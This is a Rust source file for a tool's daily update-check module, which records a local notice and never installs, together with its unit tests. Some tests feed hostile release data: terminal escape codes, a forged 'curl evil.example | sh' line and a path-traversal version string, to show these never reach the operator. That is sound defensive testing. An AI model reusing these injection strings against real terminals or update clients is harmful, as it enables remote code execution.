//! The daily update check, and the LOCAL notice it leaves.
//!
//! **Check and notice. Never install**: *"we're young, we'll be
//! updating quickly and we're sure to run into security flaws we'll want to correct and give notice
//! to our install base."* A scheduled run asks the origin what it publishes, writes down the answer,
//! and stops. Applying an update stays exactly what it was — the explicit, sudo-gated
//! `cermet update`, with its consent paragraph and its human at the keyboard.
//!
//! # What runs, and as whom
//!
//! A native scheduler on each platform: a systemd timer +
//! oneshot service on Linux (`cermet-update-check.timer`), a LaunchDaemon with a daily calendar
//! interval on macOS (`dev.cermet.update-check.plist`). Both run `cermet update --daily-check` **as
//! the human operator** — never root, never the daemon account. That is load-bearing, not tidiness:
//! the custody statement says the credential-holding process has no vendor-facing client, and it
//! must stay literally true. `cermetd` contains no update-check code and nothing in its dispatch
//! path reaches here.
//!
//! # What crosses the wire
//!
//! One parameterless GET of this project's GitHub release (`repos/<slug>/releases/latest`), and —
//! only when that release is one this box could install — a second parameterless GET of that
//! release's own `SHA256SUMS`. No install id, no account, no query, no body, no token, and no
//! header beyond the user agent. The version comparison happens HERE, on the answer.
//!
//! The user agent is `cermet/<version>` (`crate::update::fetch`), and that is DELIBERATE and ruled:
//! knowing which releases are still out there is the operational point of a
//! feature whose job is to give an install base notice — a security advisory is worth little if
//! nobody knows who is still stranded on the vulnerable version. It identifies a RELEASE, and the
//! string is identical on every install of that release, so it distinguishes no installation from
//! any other. Every surface that describes this request says so in those words; a wire that carries
//! a version while the copy says "no version string" is a contradiction a review caught, and the
//! fix was to make the copy honest rather than to blind ourselves.
//!
//! # The notice, three local surfaces
//!
//! 1. this module's [`UpdateState`] file, beside the uploader's own state under the operator's
//!    config directory;
//! 2. a one-line notice on stderr before any operator CLI command, while the state says there is
//!    something newer to install — [`notice`], suppressed for machine output by
//!    [`notice_is_suppressed`];
//! 3. a row in `cermet check` (see [`UpdateCheckReport`]).
//!
//! A release whose BODY's first line starts with `SECURITY:` (`update::SECURITY_MARKER`) escalates
//! the wording and prints the release page. It escalates the WORDS and nothing else: no automatic
//! install, no different network behavior.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use time::format_description::well_known::Rfc3339;
use time::OffsetDateTime;

use crate::update::{self, Channel, Fetched, Origin, Plan, Verification};
use crate::{CliError, CliOutput};

// ---- local state ---------------------------------------------------------------------------------

/// The check's own directory, beside the operator's settings file and the uploader's watermark:
/// `<config>/cermet/update/`. It holds one thing — what the last check saw. Nothing in it is ever
/// transmitted, and the daemon neither reads nor writes it.
pub fn state_dir(config_path: &Path) -> PathBuf {
    config_path
        .parent()
        .unwrap_or_else(|| Path::new("."))
        .join("update")
}

fn state_path(dir: &Path) -> PathBuf {
    dir.join("state.json")
}

/// What the last check SAW. Signals, not conclusions: the notice and the
/// `cermet check` row derive what they say from these fields at the moment they say it.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct UpdateState {
    /// When the last check ran, RFC3339.
    pub checked_at: String,
    /// The version that was running when it ran. Recorded so a state file left behind by an older
    /// build is legible rather than mysterious.
    pub running: String,
    /// A version the release channel publishes that THIS box could install, artifact and checksum
    /// resolved. Absent means there was nothing to record: up to date, no release published, no
    /// artifact for this box, or a check that did not complete.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub available: Option<String>,
    /// Does that release correct a security defect?
    #[serde(default)]
    pub security: bool,
    /// The release page to read the advisory on, if the origin publishes one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub notes: Option<String>,
    /// How the available version was verified.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub verification: Option<Verification>,
    /// Why the last check believed nothing new. Present alongside a stale [`UpdateState::available`]
    /// on purpose: a transient failure must not erase a notice that is still true.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub problem: Option<String>,
}

/// Read the recorded state. An absent file is `None` — a box that has never checked — and a file
/// that does not parse is an ERROR the `cermet check` row reports. The notice path swallows that
/// error by construction: an unreadable state file must never break every command on the box.
pub fn read_state(dir: &Path) -> Result<Option<UpdateState>, CliError> {
    let path = state_path(dir);
    let text = match std::fs::read_to_string(&path) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => {
            return Err(CliError::Malformed(format!(
                "cannot read {}: {error}",
                path.display()
            )))
        }
    };
    serde_json::from_str(&text).map(Some).map_err(|error| {
        CliError::Malformed(format!(
            "{} is not a readable update-check state: {error}\ndelete it and the next check will \
             write a fresh one",
            path.display()
        ))
    })
}

pub fn write_state(dir: &Path, state: &UpdateState) -> Result<(), CliError> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::create_dir_all(dir).map_err(|error| {
        CliError::Malformed(format!("cannot create {}: {error}", dir.display()))
    })?;
    std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700)).map_err(|error| {
        CliError::Malformed(format!("cannot set mode on {}: {error}", dir.display()))
    })?;
    let body = serde_json::to_string_pretty(state)
        .map_err(|error| CliError::Malformed(format!("cannot render the state: {error}")))?;
    std::fs::write(state_path(dir), body).map_err(|error| {
        CliError::Malformed(format!(
            "cannot write {}: {error}",
            state_path(dir).display()
        ))
    })
}

// ---- the notice ----------------------------------------------------------------------------------

/// The one line an operator CLI invocation prints while there is something newer to install.
///
/// `None` while the recorded state names nothing this box could install, or names the version
/// already running — which is what makes the notice stop the moment the operator updates, with no
/// second command and no state to clear by hand.
///
/// A `security` release escalates the WORDS and prints the advisory. Nothing else about the run
/// changes: no install, no different network behavior, no exit code.
pub fn notice(state: &UpdateState, running: &str) -> Option<String> {
    let available = state.available.as_deref()?;
    if available == running {
        return None;
    }
    let mut line = if state.security {
        format!("cermet: SECURITY UPDATE available — {running} → {available}. run: cermet update")
    } else {
        format!("cermet: update available — {running} → {available}. run: cermet update")
    };
    if let Some(notes) = &state.notes {
        line.push_str(&format!("   ({notes})"));
    }
    Some(line)
}

/// Is this invocation MACHINE output, whose caller must not meet a notice?
///
/// The notice goes to stderr, so stdout is never polluted whatever this answers. This is the second
/// guard, for the two callers whose stderr is a protocol-adjacent channel rather than a human's
/// terminal: the `cermet mcp` stdio bridge an agent client speaks JSON-RPC over, and any invocation
/// asking for `--json`.
pub fn notice_is_suppressed(argv: &[String]) -> bool {
    if argv.iter().any(|argument| argument == "--json") {
        return true;
    }
    // THE SUBCOMMAND, not argv[0] (U4, review 2026-08-17). `cermet mcp install` registers the
    // bridge as `cermet --socket <sock> mcp`, so the invocation an agent actually launches carries
    // a flag pair BEFORE the subcommand; matching argv[0] missed it and printed the notice into a
    // JSON-RPC peer's stderr. `split_socket_flag` is the same reading the CLI itself does.
    let positional = positional_arguments(argv);
    // Bare `cermet mcp` is the stdio server; `cermet mcp install` is an ordinary operator command.
    positional.first().copied() == Some("mcp") && positional.get(1).copied() != Some("install")
}

/// The invocation with the global flags dropped, in the SAME shape
/// [`crate::split_socket_flag`] reads them: `--socket` consumes the token after it, and anything
/// else beginning with `-` is a flag of its own.
fn positional_arguments(argv: &[String]) -> Vec<&str> {
    let mut positional = Vec::new();
    let mut it = argv.iter();
    while let Some(argument) = it.next() {
        match argument.as_str() {
            "--socket" => {
                let _ = it.next();
            }
            flag if flag.starts_with('-') => {}
            value => positional.push(value),
        }
    }
    positional
}

// ---- the scheduled check -------------------------------------------------------------------------

/// One run of the daily check.
///
/// **A disabled check makes ZERO network contact** — it does not resolve an origin, does not open a
/// socket, and does not touch the state file. That is asserted on the fetch seam itself rather than
/// on a timing, so the claim is checked rather than described.
///
/// Everything else about a scheduled run is quiet and exits 0. A host that is down, a release whose
/// SHA256SUMS has not been uploaded yet during a rollout, a project with no release yet: none of
/// these are service failures, and a timer that reports them as failures teaches an operator to
/// ignore it. The failure is RECORDED (`problem`) and tomorrow's run heals it. A recorded notice
/// that is still true survives a failed check — a transient outage must not erase it.
#[allow(clippy::too_many_arguments)]
pub fn run_daily_check(
    enabled: bool,
    dir: &Path,
    origin: &Origin,
    repo: &str,
    target: Option<&str>,
    channel: Channel,
    running: &str,
    now: OffsetDateTime,
    fetch: &dyn Fn(&str) -> Result<Fetched, String>,
) -> Result<CliOutput, CliError> {
    if !enabled {
        return Ok(CliOutput {
            text: "the daily update check is off (cermet update --daily on)".to_string(),
            ok: true,
        });
    }
    let checked_at = now
        .format(&Rfc3339)
        .unwrap_or_else(|_| now.unix_timestamp().to_string());
    // A previously recorded notice survives a check that does not complete, so a bad afternoon on
    // one host does not silently retract a real one. An unreadable file is treated as no file: the
    // fresh write repairs it.
    let previous = read_state(dir).ok().flatten();
    let mut state = UpdateState {
        checked_at,
        running: running.to_string(),
        ..Default::default()
    };

    let release = match update::obtain_release(origin, repo, fetch) {
        Err(problem) => return record_problem(dir, state, previous, problem),
        Ok(None) => {
            // No release is published yet. A fact about the project, and not a problem: there is
            // simply nothing to record.
            write_state(dir, &state)?;
            return Ok(CliOutput {
                text: format!(
                    "no update channel is published yet: {} is not there.",
                    origin.release_url(repo)
                ),
                ok: true,
            });
        }
        Ok(Some(release)) => release,
    };

    match update::plan(running, &release, target, channel) {
        Plan::UpToDate { version } => {
            state.verification = Some(Verification::NoArtifact);
            write_state(dir, &state)?;
            Ok(CliOutput {
                text: format!("cermet {version} is current."),
                ok: true,
            })
        }
        // Something is published, and it is not for this box. Recorded as nothing available — a
        // notice telling the operator to run an update that would then refuse is noise.
        Plan::NoArtifactForTarget {
            version, target, ..
        } => {
            state.verification = Some(Verification::NoArtifact);
            state.problem = Some(format!(
                "the release channel publishes {version}, with nothing this box's channel can \
                 install for {target}"
            ));
            write_state(dir, &state)?;
            Ok(CliOutput {
                text: format!("{version} is published, with nothing installable for {target}."),
                ok: true,
            })
        }
        Plan::Available { version, file, .. } => {
            // ADVERTISE ONLY WHAT THIS BOX COULD ACTUALLY INSTALL: the checksum is resolved from
            // the release's own SHA256SUMS before a notice is recorded. A release mid-upload,
            // whose asset is listed but whose sums are not there yet, records the failure and
            // advertises nothing; tomorrow's check heals it.
            let verification = match update::obtain_artifact(origin, repo, &version, &file, fetch) {
                Ok(_) => Verification::GithubRelease,
                Err(problem) => return record_problem(dir, state, previous, problem),
            };
            state.available = Some(version.clone());
            state.security = release.security;
            state.notes = release.notes.clone();
            state.verification = Some(verification);
            write_state(dir, &state)?;
            Ok(CliOutput {
                text: format!(
                    "cermet {running} → {version} is available ({}); the notice is local. run: \
                     cermet update",
                    verification.word()
                ),
                ok: true,
            })
        }
    }
}

/// A check that did not complete: stamp the attempt, keep whatever was already true, say why.
fn record_problem(
    dir: &Path,
    mut state: UpdateState,
    previous: Option<UpdateState>,
    problem: String,
) -> Result<CliOutput, CliError> {
    if let Some(previous) = previous {
        state.available = previous.available;
        state.security = previous.security;
        state.notes = previous.notes;
        state.verification = previous.verification;
    }
    state.problem = Some(problem.clone());
    write_state(dir, &state)?;
    Ok(CliOutput {
        text: format!("the update check did not complete: {problem}"),
        ok: true,
    })
}

// ---- the knob ------------------------------------------------------------------------------------

/// `cermet update --daily on|off`, against the operator's own settings file.
///
/// It lives under the existing `update` noun rather than a noun of its own: it governs exactly one
/// thing that noun already does. No daemon is consulted — the setting is the human's, in the human's
/// own file, and turning it off needs no root. The command prints the state that resulted, so the
/// operator never runs a second one to learn what they just did.
pub fn run_daily_setting(path: &Path, enabled: bool) -> Result<CliOutput, CliError> {
    crate::settings::write_update_check(path, enabled)?;
    Ok(CliOutput {
        text: daily_setting_text(enabled, path),
        ok: true,
    })
}

fn daily_setting_text(enabled: bool, path: &Path) -> String {
    if enabled {
        format!(
            "daily update check: enabled\n\
             setting: {} (update_check = \"on\")\n\
             One parameterless GET of {} a day, run as you and never by the daemon. It records a \
             local notice and installs nothing; applying an update stays `cermet update`.\n\
             Change it: cermet update --daily off",
            path.display(),
            update::origin(None).release_url(update::UPDATE_REPO),
        )
    } else {
        format!(
            "daily update check: disabled\n\
             setting: {} (update_check = \"off\")\n\
             Nothing is contacted on a schedule. `cermet update --check` still asks when you type \
             it.\n\
             Change it: cermet update --daily on",
            path.display()
        )
    }
}

// ---- what `cermet check` reads ---------------------------------------------------------------------

/// The update channel's local state, gathered for one `cermet check` row.
#[derive(Debug, Clone, Default)]
pub struct UpdateCheckReport {
    /// Is the daily check enabled?
    pub enabled: bool,
    /// What the last check recorded, if it has ever run.
    pub state: Option<UpdateState>,
    /// A settings or state file that could not be read. Reported, never guessed around.
    pub problem: Option<String>,
}

impl UpdateCheckReport {
    /// Read the report off this box's own config directory.
    pub fn read(config_path: &Path) -> Self {
        let (enabled, mut problem) = match crate::settings::read_update_check(config_path) {
            Ok(enabled) => (enabled, None),
            // Fail SAFE for the report, not fail closed: an unreadable setting is reported as its
            // own finding, and the row still prints what the last check saw.
            Err(error) => (true, Some(format!("{error}"))),
        };
        let state = match read_state(&state_dir(config_path)) {
            Ok(state) => state,
            Err(error) => {
                problem.get_or_insert_with(|| format!("{error}"));
                None
            }
        };
        Self {
            enabled,
            state,
            problem,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SUM_A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const REPO: &str = crate::update::UPDATE_REPO;

    fn temp() -> tempfile::TempDir {
        tempfile::tempdir().expect("tempdir")
    }

    fn now() -> OffsetDateTime {
        OffsetDateTime::from_unix_timestamp(1_786_000_000).expect("a fixed instant")
    }

    fn github() -> Origin {
        crate::update::origin(None)
    }

    fn release_json(version: &str, body: &str) -> String {
        format!(
            r#"{{"tag_name":"v{version}","body":{},"assets":[
                 {{"name":"cermet_{version}_linux_amd64.tar.gz"}},
                 {{"name":"cermet_{version}_amd64.deb"}},
                 {{"name":"SHA256SUMS"}}]}}"#,
            serde_json::to_string(body).unwrap()
        )
    }

    /// The whole release, served: the `releases/latest` document, and the `SHA256SUMS` asset the
    /// checksum is resolved from.
    fn a_release(
        version: &'static str,
        body: &'static str,
    ) -> impl Fn(&str) -> Result<Fetched, String> {
        move |url: &str| {
            Ok(if url.ends_with("SHA256SUMS") {
                Fetched::Body(
                    format!("{SUM_A}  cermet_{version}_linux_amd64.tar.gz\n").into_bytes(),
                )
            } else {
                Fetched::Body(release_json(version, body).into_bytes())
            })
        }
    }

    fn check(
        enabled: bool,
        dir: &Path,
        running: &str,
        fetch: &dyn Fn(&str) -> Result<Fetched, String>,
    ) -> CliOutput {
        run_daily_check(
            enabled,
            dir,
            &github(),
            REPO,
            Some("linux_amd64"),
            Channel::Tarball,
            running,
            now(),
            fetch,
        )
        .expect("a scheduled check answers")
    }

    /// THE OFF SWITCH, asserted at the client seam: a disabled check does not fetch, does not
    /// write, and does not create its own directory. Anything less and "off" is a claim rather than
    /// a property.
    #[test]
    fn a_disabled_check_makes_zero_network_contact_and_writes_nothing() {
        let dir = temp();
        let state = dir.path().join("update");
        let never = |url: &str| -> Result<Fetched, String> {
            panic!("a disabled update check must not fetch {url}")
        };
        let out = check(false, &state, "0.1.0", &never);
        assert!(out.ok);
        assert!(out.text.contains("off"), "{}", out.text);
        assert!(
            out.text.contains("cermet update --daily on"),
            "it says how to turn it back on: {}",
            out.text
        );
        assert!(!state.exists(), "a disabled check writes nothing at all");
    }

    /// The ordinary happy path: a newer release, recorded, with the notice derived from it — and
    /// exactly TWO parameterless GETs, both at the same release.
    #[test]
    fn a_newer_version_is_recorded_and_becomes_a_notice() {
        let dir = temp();
        let state = dir.path().join("update");
        let asked = std::cell::RefCell::new(Vec::new());
        let serve = a_release("0.1.1", "ordinary release");
        let counting = |url: &str| {
            asked.borrow_mut().push(url.to_string());
            serve(url)
        };
        let out = check(true, &state, "0.1.0", &counting);
        assert!(out.ok, "{}", out.text);
        assert!(out.text.contains("0.1.0 → 0.1.1"), "{}", out.text);
        assert_eq!(
            asked.borrow().as_slice(),
            [
                "https://api.github.com/repos/suarezc/cermet/releases/latest".to_string(),
                "https://github.com/suarezc/cermet/releases/download/v0.1.1/SHA256SUMS".to_string(),
            ],
            "the release, then that release's own checksums — nothing else"
        );

        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(recorded.available.as_deref(), Some("0.1.1"));
        assert_eq!(recorded.running, "0.1.0");
        assert!(!recorded.security);
        assert_eq!(recorded.verification, Some(Verification::GithubRelease));
        assert!(recorded.problem.is_none());
        assert!(!recorded.checked_at.is_empty());

        let line = notice(&recorded, "0.1.0").expect("a newer version notices");
        assert!(line.contains("update available"), "{line}");
        assert!(line.contains("0.1.0 → 0.1.1"), "{line}");
        assert!(line.contains("cermet update"), "{line}");
        assert!(
            !line.contains("SECURITY"),
            "an ordinary release must not shout: {line}"
        );
    }

    /// An UP-TO-DATE box makes ONE request a day, not two: there is nothing to install, so no
    /// checksum is resolved and the recorded mode says exactly that.
    #[test]
    fn the_notice_is_silent_when_there_is_nothing_newer() {
        let dir = temp();
        let state = dir.path().join("update");
        let asked = std::cell::RefCell::new(Vec::new());
        let serve = a_release("0.1.1", "ordinary release");
        let counting = |url: &str| {
            asked.borrow_mut().push(url.to_string());
            serve(url)
        };
        let out = check(true, &state, "0.1.1", &counting);
        assert!(out.text.contains("is current"), "{}", out.text);
        assert_eq!(asked.borrow().len(), 1, "{:?}", asked.borrow());
        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(recorded.available, None, "there is nothing to install");
        assert_eq!(recorded.verification, Some(Verification::NoArtifact));
        assert_eq!(notice(&recorded, "0.1.1"), None);

        // A state recorded before an update, read by the build that update installed: silent.
        let stale = UpdateState {
            available: Some("0.1.1".to_string()),
            ..Default::default()
        };
        assert_eq!(notice(&stale, "0.1.1"), None);
        // A box that has never checked has no state and therefore no notice.
        assert_eq!(read_state(&temp().path().join("update")).unwrap(), None);
    }

    /// THE SECURITY MARKER, end to end: the release BODY's first line
    /// starting with `SECURITY:` escalates the wording and prints the release page — and escalates
    /// nothing else: no install, no different network behavior.
    #[test]
    fn a_security_marked_release_escalates_the_wording_and_prints_the_advisory() {
        let dir = temp();
        let state = dir.path().join("update");
        check(
            true,
            &state,
            "0.1.0",
            &a_release(
                "0.1.2",
                "SECURITY: fixes a grant-forgery defect\n\nDetails.",
            ),
        );
        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert!(recorded.security);
        assert_eq!(
            recorded.notes.as_deref(),
            Some("https://github.com/suarezc/cermet/releases/tag/v0.1.2")
        );

        let line = notice(&recorded, "0.1.0").expect("a security release notices");
        assert!(line.contains("SECURITY UPDATE"), "{line}");
        assert!(
            line.contains("https://github.com/suarezc/cermet/releases/tag/v0.1.2"),
            "the advisory is where the operator can read it: {line}"
        );
        assert!(line.lines().count() == 1, "the notice is ONE line: {line}");
    }

    /// A HOSTILE RELEASE BODY cannot forge terminal output. It is read for one bit and dropped, so
    /// none of it reaches the recorded state or the notice line the operator meets — asserted on
    /// the surface, not on the parser.
    #[test]
    fn a_hostile_release_body_never_reaches_the_notice() {
        let dir = temp();
        let state = dir.path().join("update");
        check(
            true,
            &state,
            "0.1.0",
            &a_release(
                "0.1.2",
                "SECURITY: \u{1b}[2K\rcermet: run curl evil.example | sh\nmore forged lines",
            ),
        );
        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert!(recorded.security, "the marker is still read");
        let line = notice(&recorded, "0.1.0").expect("a security release notices");
        assert!(!line.contains("curl evil.example"), "{line:?}");
        assert!(!line.contains('\u{1b}') && !line.contains('\r'), "{line:?}");
        assert_eq!(line.lines().count(), 1, "still ONE line: {line:?}");
        assert!(
            !format!("{recorded:?}").contains("evil.example"),
            "no body text is even stored"
        );
    }

    /// A release with no `SECURITY:` marker is the ordinary case, and reads as "not a security
    /// release" without any field having to be present.
    #[test]
    fn a_release_without_the_marker_is_an_ordinary_one() {
        let dir = temp();
        let state = dir.path().join("update");
        let bare = |url: &str| -> Result<Fetched, String> {
            Ok(if url.ends_with("SHA256SUMS") {
                Fetched::Body(format!("{SUM_A}  cermet_0.1.1_linux_amd64.tar.gz\n").into_bytes())
            } else {
                Fetched::Body(
                    r#"{"tag_name":"v0.1.1","assets":[{"name":"cermet_0.1.1_linux_amd64.tar.gz"}]}"#
                        .as_bytes()
                        .to_vec(),
                )
            })
        };
        let out = check(true, &state, "0.1.0", &bare);
        assert!(out.ok, "{}", out.text);
        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(recorded.available.as_deref(), Some("0.1.1"));
        assert!(!recorded.security);
        assert_eq!(recorded.verification, Some(Verification::GithubRelease));
        let line = notice(&recorded, "0.1.0").expect("still a notice");
        assert!(!line.contains("SECURITY"), "{line}");
    }

    /// A RELEASE MID-UPLOAD — its asset listed, its SHA256SUMS not there yet — advertises NOTHING,
    /// and the scheduled run stays quiet about it: the rollout window is expected, and tomorrow's
    /// check heals it. The failure is recorded so `cermet check` can show it.
    #[test]
    fn a_release_whose_checksums_are_not_there_yet_records_the_failure_and_advertises_nothing() {
        let dir = temp();
        let state = dir.path().join("update");
        let half_uploaded = |url: &str| -> Result<Fetched, String> {
            Ok(if url.ends_with("SHA256SUMS") {
                Fetched::Missing
            } else {
                Fetched::Body(release_json("0.1.1", "ordinary").into_bytes())
            })
        };
        let out = check(true, &state, "0.1.0", &half_uploaded);
        assert!(
            out.ok,
            "a rollout window is not a service failure: {}",
            out.text
        );
        assert!(out.text.contains("did not complete"), "{}", out.text);

        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(
            recorded.available, None,
            "a version with no published checksum is never advertised"
        );
        assert!(recorded
            .problem
            .as_deref()
            .unwrap()
            .contains("publishes no SHA256SUMS"));
        assert_eq!(notice(&recorded, "0.1.0"), None, "and no notice fires");
    }

    /// An unreachable host is the same answer, whichever of the two requests could not be made.
    /// Neither exits non-zero: a timer that reports a bad afternoon as a failure teaches the
    /// operator to ignore it.
    #[test]
    fn an_unreachable_source_is_recorded_quietly_and_never_fails_the_run() {
        let dir = temp();
        for (label, fetch) in [
            (
                "the release",
                &(|_: &str| Err("connection refused".to_string()))
                    as &dyn Fn(&str) -> Result<Fetched, String>,
            ),
            (
                "its checksums",
                &(|url: &str| {
                    if url.ends_with("SHA256SUMS") {
                        Err("connection refused".to_string())
                    } else {
                        Ok(Fetched::Body(
                            release_json("0.1.1", "ordinary").into_bytes(),
                        ))
                    }
                }) as &dyn Fn(&str) -> Result<Fetched, String>,
            ),
        ] {
            let state = dir.path().join(label);
            let out = check(true, &state, "0.1.0", fetch);
            assert!(out.ok, "{label}: {}", out.text);
            let recorded = read_state(&state).expect("readable").expect("recorded");
            assert_eq!(recorded.available, None, "{label}");
            assert!(recorded.problem.is_some(), "{label}");
        }
    }

    /// A notice that is STILL TRUE survives a check that did not complete. A transient outage must
    /// not silently retract a real security notice.
    #[test]
    fn a_failed_check_keeps_a_notice_that_is_still_true() {
        let dir = temp();
        let state = dir.path().join("update");
        check(
            true,
            &state,
            "0.1.0",
            &a_release("0.1.2", "SECURITY: fixes a defect"),
        );
        let out = check(true, &state, "0.1.0", &|_: &str| {
            Err("connection refused".to_string())
        });
        assert!(out.ok, "{}", out.text);

        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(recorded.available.as_deref(), Some("0.1.2"));
        assert!(recorded.security, "the security marker survives too");
        assert!(recorded.problem.is_some(), "and the failure is recorded");
        assert!(notice(&recorded, "0.1.0").unwrap().contains("SECURITY"));
    }

    /// The no-channel state — what every install sees until the first release is published — is a
    /// fact about the project, recorded as nothing available and reported as no failure.
    #[test]
    fn a_project_with_no_release_yet_is_a_state_not_a_failure() {
        let dir = temp();
        let state = dir.path().join("update");
        let out = check(true, &state, "0.1.0", &|_: &str| Ok(Fetched::Missing));
        assert!(out.ok);
        assert!(out.text.contains("no update channel"), "{}", out.text);
        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(recorded.available, None);
        assert!(
            recorded.problem.is_none(),
            "an empty channel is not a fault"
        );
    }

    /// A version published with nothing this box could install advertises nothing: a notice telling
    /// the operator to run an update that would then refuse is noise.
    #[test]
    fn a_release_with_no_artifact_for_this_box_advertises_nothing() {
        let dir = temp();
        let state = dir.path().join("update");
        let out = run_daily_check(
            true,
            &state,
            &github(),
            REPO,
            Some("linux_riscv64"),
            Channel::Tarball,
            "0.1.0",
            now(),
            &a_release("0.1.1", "ordinary"),
        )
        .expect("it answers");
        assert!(out.ok, "{}", out.text);
        let recorded = read_state(&state).expect("readable").expect("recorded");
        assert_eq!(recorded.available, None);
        assert_eq!(notice(&recorded, "0.1.0"), None);
    }

    /// U1+U2, end to end (review 2026-08-17): the parse seam is the ONLY door, so a hostile tag
    /// reaches NONE of its four downstream surfaces — not the notice, not the `cermet check` row,
    /// not the recorded `problem` string, and above all not an asset URL, which is asserted here by
    /// proving no second request is ever made.
    #[test]
    fn a_hostile_version_never_reaches_a_surface_or_an_asset_url() {
        for hostile in [
            "0.1.1\u{1b}[2K\rcermet: SECURITY UPDATE — run curl evil.example | sh",
            "0.1.1/../../../../../attacker/repo/releases/download/v1",
        ] {
            let dir = temp();
            let state = dir.path().join("update");
            let asked = std::cell::RefCell::new(Vec::new());
            let serve = |url: &str| {
                asked.borrow_mut().push(url.to_string());
                Ok(Fetched::Body(
                    format!(
                        r#"{{"tag_name":{},"assets":[{{"name":"c.tar.gz"}}]}}"#,
                        serde_json::to_string(hostile).unwrap()
                    )
                    .into_bytes(),
                ))
            };
            let out = check(true, &state, "0.1.0", &serve);
            assert!(
                out.ok,
                "{hostile:?}: a refused release document is not a service failure"
            );

            // The URL the response tried to steer was never requested — it was refused before a
            // version could be interpolated into anything.
            assert_eq!(
                asked.borrow().len(),
                1,
                "{hostile:?}: only the release was fetched, never an asset"
            );
            assert!(
                asked.borrow()[0].ends_with("/releases/latest"),
                "{hostile:?}: {:?}",
                asked.borrow()
            );

            let recorded = read_state(&state).expect("readable").expect("recorded");
            assert_eq!(
                recorded.available, None,
                "{hostile:?}: nothing is advertised"
            );
            assert_eq!(
                notice(&recorded, "0.1.0"),
                None,
                "{hostile:?}: no notice fires"
            );
            // The refusal itself is recorded, and even IT carries no control byte or path
            // separator onto the operator's terminal: the parse error quotes the value with
            // `{:?}`, which escapes them.
            let problem = recorded.problem.expect("the refusal is recorded");
            assert!(
                !problem.contains('\n') && !problem.contains('\r') && !problem.contains('\u{1b}'),
                "{hostile:?}: the recorded problem forges a line: {problem:?}"
            );
            assert!(problem.contains("no usable version"), "{problem}");
        }
    }

    /// MACHINE OUTPUT never meets the notice. The stdio MCP bridge speaks JSON-RPC to an agent
    /// client, and `--json` was asked for by something that will parse the answer.
    #[test]
    fn the_notice_is_suppressed_for_machine_output_only() {
        let argv = |args: &[&str]| -> Vec<String> {
            args.iter().map(|a| a.to_string()).collect::<Vec<_>>()
        };
        for machine in [
            vec!["mcp"],
            // U4 (review 2026-08-17): THE REGISTERED BRIDGE ARGV. `cermet mcp install` writes
            // `cermet --socket <sock> mcp` into the agent client's config, so the invocation an
            // agent actually launches carries a flag pair BEFORE the subcommand — and matching on
            // argv[0] missed it entirely, printing the notice into a JSON-RPC peer's stderr.
            vec!["--socket", "/var/run/cermetd/agent.sock", "mcp"],
            vec!["--socket", "/x", "doc", "status", "--json"],
            vec!["doc", "status", "--json"],
        ] {
            assert!(
                notice_is_suppressed(&argv(&machine)),
                "{machine:?} is machine output"
            );
        }
        for human in [
            vec!["log"],
            vec!["check"],
            vec!["mcp", "install"],
            // …and the flag-carrying form of the operator command is still a human at a terminal.
            vec!["--socket", "/x", "mcp", "install"],
            vec!["--socket", "/x", "log"],
            vec!["update", "--check"],
            vec!["rules"],
            vec![],
        ] {
            assert!(
                !notice_is_suppressed(&argv(&human)),
                "{human:?} is a human at a terminal"
            );
        }
    }

    /// THE WIRE AND THE COPY MUST AGREE. The scheduled check's user agent
    /// carries `cermet/<version>` — ruled deliberate, because knowing which releases are still out
    /// there is the operational point of giving an install base notice — and every surface that
    /// describes the request says so. This is the pin: a review found surfaces claiming
    /// "no version string" over a wire that sent one, and a copy claim nothing asserts is a claim
    /// that drifts back.
    #[test]
    fn a_surface_that_describes_the_request_declares_the_user_agent() {
        // The wire, first: this is what actually goes out.
        let agent = crate::update::user_agent();
        assert!(agent.starts_with("cermet/"), "{agent}");
        assert!(
            agent.contains(crate::update::CURRENT_VERSION),
            "the user agent names the release: {agent}"
        );

        let surfaces: [(&str, String); 4] = [
            ("the settings file", crate::settings::settings_file(true)),
            (
                "cermet update --help",
                crate::help_text(&["update".to_string(), "--help".to_string()])
                    .expect("update has its own usage")
                    .to_string(),
            ),
            (
                "the systemd unit",
                include_str!("../../../dist/linux/cermet-update-check.service").to_string(),
            ),
            (
                "docs/QUICKSTART.md",
                include_str!("../../../docs/QUICKSTART.md").to_string(),
            ),
        ];
        for (name, text) in surfaces {
            // Normalized to one line with comment markers dropped: these surfaces are hard-wrapped
            // prose, and two of them (the settings file, the systemd unit) wrap it inside `#`
            // comments, so a sentence is routinely split as `user\n# agent`.
            let flat = text
                .split_whitespace()
                .filter(|word| *word != "#")
                .collect::<Vec<_>>()
                .join(" ");
            assert!(
                flat.contains("user agent"),
                "{name} describes the request without declaring its user agent"
            );
            assert!(
                flat.contains("cermet/<version>") || flat.contains("cermet/0.1.0"),
                "{name} does not name what the user agent actually says"
            );
            for contradiction in [
                "no version string",
                "no version and no parameters",
                "no version, no query",
                "no install id, no version",
            ] {
                assert!(
                    !flat.contains(contradiction),
                    "{name} claims {contradiction:?} over a wire that sends {agent}"
                );
            }
        }
    }

    /// The state directory sits beside the operator's settings file and the uploader's watermark —
    /// one config directory, three files that belong to the human.
    #[test]
    fn the_state_lives_beside_the_operators_own_settings_file() {
        assert_eq!(
            state_dir(Path::new("/home/ada/.config/cermet/config.toml")),
            PathBuf::from("/home/ada/.config/cermet/update")
        );
    }

